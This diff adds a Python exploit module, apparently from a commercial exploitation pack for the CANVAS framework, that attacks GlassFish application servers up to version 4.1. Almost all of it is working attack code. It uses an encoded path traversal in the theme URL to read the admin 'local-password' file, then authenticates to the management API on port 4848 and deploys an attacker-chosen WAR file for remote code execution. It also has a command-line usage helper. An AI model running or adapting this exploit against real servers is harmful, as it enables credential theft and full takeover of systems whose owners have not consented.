@@ -1,0 +1,127 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+
+import sys, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+import libs.spkproxy as spkproxy
+import canvasengine
+
+
+# GUI info
+NAME = "d2sec_glassfish"
+DESCRIPTION = "Glassfish Remote Code Exec with Path Traversal Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['References'] = "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['Versions Affected'] = "<= 4.1"
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["Notes"] = "s path traversal vulnerability can be use to execute remote arbitrary command on server. By example, deploy a war file"
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"] ]
+
+
+class theexploit (tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 4848 
+    self.version = 0
+    self.done = 0
+    self.basicauth_user = 'admin'
+    self.basicauth_password = ''
+    self.platform = 'linux'
+    self.pathwar = '/dev/shm/test.war'
+    self.basicauth_user = 'admin'
+    self.basicauth_password = ''
+    self.ssl = 0
+    self.url = ''
+    return
+
+  def grab_file(self):
+    lin = "theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/proc/self/cwd/local-password"
+    win = "theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/local-password"
+    target = ''
+    if 'windows' in self.platform:
+      target = '%s/%s' % (self.url, win)
+    else:
+      target = '%s/%s' % (self.url, lin)
+    ua = spkproxy.UserAgent('', exploit=self)
+    self.basicauth_password = ua.GET(target, '')[:-1]
+
+  def deploy_war(self):
+    auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
+    target = '%s/management/domain/applications/application' % self.url
+    ua = spkproxy.UserAgent(target, auth=auth, exploit=self)
+    ua.addHeader('Accept', 'application/json')
+    ua.addHeader('X-Requested-By', 'dummy')
+    data = "id=%s&force=true" % self.pathwar
+    response = ua.POST("", data)
+    return response
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.ssl = int(self.argsDict.get("ssl",self.ssl))
+    self.pathwar = self.argsDict.get("pathwar", self.pathwar)
+    self.platform = self.argsDict.get("platform", self.platform)
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
+    
+    if self.ssl == 0:
+      self.url = 'http://%s:%d' % (self.host, self.port)
+    else:
+      self.url = 'https://%s:%d' % (self.host, self.port)
+
+    self.grab_file()
+    if 'DOCTYPE' in self.basicauth_password:
+      self.log('[D2] %s' % self.basicauth_password)
+      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      self.log("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      return 0
+    self.log('[D2] local_password file dumped : %s' % self.basicauth_password)
+
+    nfo = self.deploy_war()
+    self.log ('[D2] %s' % nfo)
+    if 'SUCCESS' in nfo:
+      self.setInfo("%s attacking %s:%d - success" % (NAME, self.host, self.port))
+      self.log("%s attacking %s:%d - success" % (NAME, self.host, self.port))
+      return 1
+    
+    return 0
+
+  def usage(self):
+    print "Usage: %s -t target [-p port:4848] -O ssl:0|1 -O platform:<windows|linux> -O pathwar:<war pathname>" % sys.argv[0]
+    sys.exit(0)
+
+
+
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
+
